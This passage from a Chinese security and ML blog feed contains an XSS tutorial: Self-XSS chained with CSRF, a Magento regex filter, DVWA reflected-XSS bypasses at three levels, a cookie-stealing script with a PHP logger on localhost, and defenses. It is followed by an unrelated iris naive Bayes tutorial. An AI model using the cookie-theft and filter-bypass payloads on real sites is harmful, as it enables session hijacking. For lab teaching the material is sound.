XSS。但是由于这个隐私信息只能由用户本人查看也就无法用于攻击其他人。这类漏洞通常危害很小，显得有些鸡肋。但是在一些具体的场景下，结合其他漏洞（比如 CSRF ）就能将 Self-XSS 转变为具有危害的漏洞。下面将总结一些常见可利用 Self-XSS 的场景。</p><ul><li>登录登出存在 CSRF，个人信息存在 Self-XSS，第三方登录</li></ul><p>这种场景一般的利用流程是首先攻击者在个人信息 XSS 点注入 Payload，然后攻击者制造一个恶意页面诱导受害者访问，恶意页面执行以下操作：</p><ol><li>恶意页面执行利用 CSRF 让受害者登录攻击者的个人信息位置，触发 XSS payload</li><li>JavaScript Payload 生成  <code>&lt;iframe&gt;</code>  标签，并在框架内执行以下这些操作</li><li>让受害者登出攻击者的账号</li><li>然后使得受害者通过 CSRF 登录到自己的账户个人信息界面</li><li>攻击者从页面提取 CSRF Token</li><li>然后可以使用 CSRF Token 提交修改用户的个人信息</li></ol><p>这种攻击流程需要注意几个地方：第三步登录是不需要用户交互的，利用 Google Sign In 等非密码登录方式登录；<strong>X-Frame-Options</strong> 需要被设置为同源（该页面可以在相同域名页面的 <code>iframe</code> 中展示 ）</p><ul><li><p>登录存在 CSRF，账户信息存在 Self-XSS，OAUTH 认证</p></li><li><p>让用户退出账户页面，但是不退出 OAUTH 的授权页面，这是为了保证用户能重新登录其账户页面</p></li><li><p>让用户登录我们的账户页面出现 XSS，利用 使用   <code>&lt;iframe&gt;</code>  标签等执行恶意代码</p></li><li><p>登录回他们各自的账户，但是我们的 XSS 已经窃取到 Session</p></li></ul><h3 id="1-4-正则表达式规则"><a href="#1-4-正则表达式规则" class="headerlink" title="1.4 正则表达式规则"></a>1.4 正则表达式规则</h3><p> 以一个网上商城应用 <a href="https://magento.com/" target="_blank" rel="noopener">Magento</a> 中的过滤类 <a href="https://github.com/nexcess/magento/blob/master/app/code/core/Mage/Core/Model/Input/Filter/MaliciousCode.php" target="_blank" rel="noopener">Mage_Core_Model_Input_Filter_MaliciousCode</a> 为例，部分代码如下： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $_expressions = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'/(\/\*.*\*\/)/Us'</span>,</span><br><span class="line">    <span class="string">'/(\t)/'</span>,</span><br><span class="line">    <span class="string">'/(javascript\s*:)/Usi'</span>,</span><br><span class="line">    <span class="string">'/(@import)/Usi'</span>,</span><br><span class="line">    <span class="string">'/style=[^&lt;]*((expression\s*?\([^&lt;]*?\))|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">    <span class="string">'/(ondblclick|onclick|onkeydown|onkeypress|onkeyup|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup|onload|onunload|onerror)=[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">    <span class="string">'/&lt;\/?(script|meta|link|frame|iframe).*&gt;/Uis'</span>,</span><br><span class="line">    <span class="string">'/src=[^&lt;]*base64[^&lt;]*(?=\&gt;)/Uis'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;_expressions, <span class="string">''</span>, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组 $_expressions 中包含一系列用于过滤的正则表达式，然后通过使用 preg_replace 函数进行恶意代码的过滤。所以当尝试输入 <code>&lt;script&gt;foo&lt;/script&gt;</code> 时，两个标签都会被移除而只剩下 foo。</p><h2 id="0x02-简单实例分析"><a href="#0x02-简单实例分析" class="headerlink" title="0x02 简单实例分析"></a>0x02 简单实例分析</h2><p>以下三个类型的实例，环境为DVWA平台，系统为windows</p><h3 id="2-1-反射型XSS-Low等级"><a href="#2-1-反射型XSS-Low等级" class="headerlink" title="2.1 反射型XSS-Low等级"></a>2.1 反射型XSS-Low等级</h3><ul><li><strong>先利用alert测试是否存在xss</strong> </li></ul><p>  <img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss01.png" alt=""></p><p>出现弹窗，说明存在xss漏洞</p><ul><li><p>源码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过源码，观察，直接使用name参数，并未进行任何过滤和检查，故存在xss漏洞</p></li><li><p><strong>编写PHP文档获取页面的cookie：</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">file_put_contents(<span class="string">'cookie.txt'</span>,$cookie);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>编写js代码将页面的cookie发送到cookie.php中</strong> </p><p>当在火狐浏览器中在，以下位置输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+<span class="built_in">document</span>.cookie&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>并点击提交，页面跳转，说明执行了js代码</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss03.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> </span><br></pre></td></tr></table></figure></li><li><p>跳转至下页面，并打开cookie.txt</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss04.png" alt=""></p></li><li><p><strong>如上图，表示成功拿到cookie</strong>，也就可以通过cookie登陆dvwa</p></li><li><p>js代码分析： document.location</p><p> <strong>[document 对象]</strong> :该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档 </p><p> <strong>document.location</strong> 包含 href 属性，直接取值赋值时相当于 document.location.href。<br>document.location.href 当前页面完整 URL </p></li></ul><h3 id="2-2-反射型XSS-Medium等级"><a href="#2-2-反射型XSS-Medium等级" class="headerlink" title="2.2 反射型XSS-Medium等级"></a>2.2 反射型XSS-Medium等级</h3><ul><li><p><strong>先利用alert进行弹窗测试</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss05.png" alt=""></p><p><strong>发现页面没有反应，有可能是被过滤了，浏览器虽然会过滤·<code>&lt;script&gt;</code>标签关键字，但是只过滤一次，所以可以想办法绕过</strong> </p></li><li><p>绕过1： 通过构造两个标签，即嵌套</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss06.png" alt=""></p><p> <strong>出现弹窗，说明存xss</strong> </p></li><li><p>绕过2：<strong>也可以大小写混写进行绕过</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss07.png" alt=""></p><p><strong>出现弹窗，说明存在xss</strong> </p></li><li><p><strong>然后利用js代码获取cookie,成功拿到cookie</strong> </p></li><li><p>源代码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>str_replace()对<code>&lt;script&gt;</code>进行了过滤‘</li></ul></li></ul><h3 id="2-3-反射型XSS-High等级"><a href="#2-3-反射型XSS-High等级" class="headerlink" title="2.3 反射型XSS-High等级"></a>2.3 反射型XSS-High等级</h3><ul><li><p><strong>还是先利用弹窗测试是否存在xss,像low和medium等级那样操作发现页面并没有出现弹窗。</strong> </p></li><li><p><strong>接下来我们换个标签，img标签和iframe标签（在一个HTML中嵌入另一个HTML）</strong> </p></li><li><p>Img：<code>&lt;img src=x onerror=alert(1)&gt;</code></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss02.png" alt=""></p><ul><li><p>Iframe: <code>&lt;iframe onload=alert(1)&gt;</code> </p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20406dvwaxss08.png" alt=""></p></li><li><p><strong>两个都成功的出现弹窗</strong> </p></li><li><p>源代码分析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>利用preg_replace()正则表达过滤掉所有形式的<code>&lt;script&gt;</code></li></ul></li><li><p>观察下面反射型xss-impossible等级代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// Is there any input?</span></span><br><span class="line">  <span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>代码采用了Anti-CSRF token机制</li><li>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</li><li>预定义的字符是：<ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul></li></ul></li></ul><h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="3-1-HttpOnly-防止劫取-Cookie"><a href="#3-1-HttpOnly-防止劫取-Cookie" class="headerlink" title="3.1 HttpOnly 防止劫取 Cookie"></a>3.1 <strong>HttpOnly 防止劫取 Cookie</strong></h3><ul><li>攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。 </li></ul><h3 id="3-2-用户端输入检查"><a href="#3-2-用户端输入检查" class="headerlink" title="3.2 用户端输入检查"></a>3.2 <strong>用户端输入检查</strong></h3><ul><li><p>对于用户的任何输入要进行检查、过滤和转义。</p></li><li><p>建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。 </p></li><li><p>HTML转义：对用户输入的内容进行HTML转义，转义后可以确保用户输入的内容在浏览器中作为文本显示，而不是作为代码解析。 </p></li><li><p>一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; vuejs 中的 decodingMap</span><br><span class="line">&#x2F;&#x2F; 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉</span><br><span class="line">const decodingMap &#x3D; &#123;</span><br><span class="line">  &#39;&lt;&#39;: &#39;&lt;&#39;,</span><br><span class="line">  &#39;&gt;&#39;: &#39;&gt;&#39;,</span><br><span class="line">  &#39;&quot;&#39;: &#39;&quot;&#39;,</span><br><span class="line">  &#39;&amp;&#39;: &#39;&amp;&#39;,</span><br><span class="line">  &#39;</span><br><span class="line">  &#39;: &#39;\n&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-3-服务端输出检查"><a href="#3-3-服务端输出检查" class="headerlink" title="3.3 服务端输出检查"></a><strong>3.3 服务端输出检查</strong></h3><ul><li>用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。 </li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【机器学习算法】鸢尾花数据集GaussianNB分类预测</title>
      <link href="2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/"/>
      <url>2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><p> UC Irvine具有用于存储各种数据的大型存储库。 本文使用<strong>鸢尾花数据集</strong>（<a href="https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。" target="_blank" rel="noopener">https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。</a> 为分类任务实施<strong>朴素贝叶斯分类器</strong>。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用<strong>高斯模型</strong>。</p><a id="more"></a><h3 id="0x01-实验流程"><a href="#0x01-实验流程" class="headerlink" title="0x01 实验流程"></a>0x01 实验流程</h3><h4 id="1-1-加载鸢尾花数据集"><a href="#1-1-加载鸢尾花数据集" class="headerlink" title="1.1 加载鸢尾花数据集"></a>1.1 加载鸢尾花数据集</h4><ul><li>采用sklearn.datasets模块导入load_iris数据集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load the iris dataset </span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris </span><br><span class="line">iris = load_iris()</span><br></pre></td></tr></table></figure><h4 id="1-2-存储特征矩阵和响应向量"><a href="#1-2-存储特征矩阵和响应向量" class="headerlink" title="1.2 存储特征矩阵和响应向量"></a>1.2 存储特征矩阵和响应向量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># store the feature matrix (X) and response vector (y) </span></span><br><span class="line">X = iris.data </span><br><span class="line">y = iris.target</span><br></pre></td></tr></table></figure><h4 id="1-3-将X和y分为训练和测试集"><a href="#1-3-将X和y分为训练和测试集" class="headerlink" title="1.3 将X和y分为训练和测试集"></a>1.3 将X和y分为训练和测试集</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># splitting X and y into training and testing sets </span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split </span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.3</span>, random_state=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h5 id="sklearn-model-selection-train-test-split用法"><a href="#sklearn-model-selection-train-test-split用法" class="headerlink" title="sklearn.model_selection.train_test_split用法"></a><strong>sklearn.model_selection.train_test_split</strong>用法</h5><blockquote><ul><li><p>作用：将数组或矩阵拆分为训练集和测试集</p></li><li><p>语法：<code>sklearn.model_selection.train_test_split(*arrays, **options)</code></p></li><li><p>train_test_split里面常用的因数（arguments）介绍：</p><blockquote><ul><li>arrays：分割对象同样长度的列表或者numpy arrays，矩阵。</li><li>test_size：两种指定方法。1：指定小数。小数范围在0.0~0.1之间，它代表test集占据的比例。2：指定整数。整数的大小必须在这个数据集个数范围内，总不能指定一个数超出了数据集的个数范围吧。要是test_size在没有指定的场合，可以通过train_size来指定。（两个是对应关系）。如果train_size也没有指定，那么默认值是0.25.</li><li>train_size：和test_size相似。</li><li>random_state:这是将分割的training和testing集合打乱的个数设定。如果不指定的话，也可以通过numpy.random来设定随机数。</li><li>shuffle和straify不常用。straify就是将数据分层。</li></ul></blockquote></li><li><p>返回值：将输入列表拆分为训练和测试集</p></li></ul></blockquote><h5 id="train-test-split-用法举例："><a href="#train-test-split-用法举例：" class="headerlink" title="train_test_split 用法举例："></a>train_test_split 用法举例：</h5><blockquote><p>这个数据集 4列，12行</p></blockquote><ul><li>使用pandas模块，制作数据集</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">namelist = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">"name"</span> : [<span class="string">"Suzuki"</span>, <span class="string">"Tanaka"</span>, <span class="string">"Yamada"</span>, <span class="string">"Watanabe"</span>, <span class="string">"Yamamoto"</span>,</span><br><span class="line">             <span class="string">"Okada"</span>, <span class="string">"Ueda"</span>, <span class="string">"Inoue"</span>, <span class="string">"Hayashi"</span>, <span class="string">"Sato"</span>,</span><br><span class="line">              <span class="string">"Hirayama"</span>, <span class="string">"Shimada"</span>],</span><br><span class="line">    <span class="string">"age"</span>: [<span class="number">30</span>, <span class="number">40</span>, <span class="number">55</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">28</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">49</span>, <span class="number">53</span>],</span><br><span class="line">    <span class="string">"department"</span>: [<span class="string">"HR"</span>, <span class="string">"Legal"</span>, <span class="string">"IT"</span>, <span class="string">"HR"</span>, <span class="string">"HR"</span>, <span class="string">"IT"</span>,</span><br><span class="line">                  <span class="string">"Legal"</span>, <span class="string">"Legal"</span>, <span class="string">"IT"</span>, <span class="string">"HR"</span>, <span class="string">"Legal"</span>, <span class="string">"Legal"</span>],</span><br><span class="line">    <span class="string">"attendance"</span>: [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"> &#125;)</span><br><span class="line">namelist</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>2</td>      <td>Yamada</td>      <td>55</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>4</td>      <td>Yamamoto</td>      <td>41</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>8</td>      <td>Hayashi</td>      <td>33</td>      <td>IT</td>      <td>0</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>将testing数据指定为0.3（test_size=0.3），从而将testing和training 集合分开。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_train</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>3</td>      <td>Watanabe</td>      <td>29</td>      <td>HR</td>      <td>0</td>    </tr>    <tr>      <td>5</td>      <td>Okada</td>      <td>28</td>      <td>IT</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>4</td>      <td>Yamamoto</td>      <td>41</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>9</td>      <td>Sato</td>      <td>39</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>2</td>      <td>Yamada</td>      <td>55</td>      <td>IT</td>      <td>1</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>7</td>      <td>Inoue</td>      <td>24</td>      <td>Legal</td>      <td>0</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>8</td>      <td>Hayashi</td>      <td>33</td>      <td>IT</td>      <td>0</td>    </tr>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>接下来是将testing数据指定为具体数目。test_size=5</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="number">5</span>)</span><br><span class="line">namelist_test</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>name</th>      <th>age</th>      <th>department</th>      <th>attendance</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>Suzuki</td>      <td>30</td>      <td>HR</td>      <td>1</td>    </tr>    <tr>      <td>1</td>      <td>Tanaka</td>      <td>40</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>6</td>      <td>Ueda</td>      <td>42</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>10</td>      <td>Hirayama</td>      <td>49</td>      <td>Legal</td>      <td>1</td>    </tr>    <tr>      <td>11</td>      <td>Shimada</td>      <td>53</td>      <td>Legal</td>      <td>1</td>    </tr>  </tbody></table></div><ul><li>接下来将training data 指定为0.5（training_size=0.5）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">namelist_train, namelist_test = train_test_split(namelist, test_size=<span class="literal">None</span>, train_size=<span class="number">0.5</span>)</span><br><span 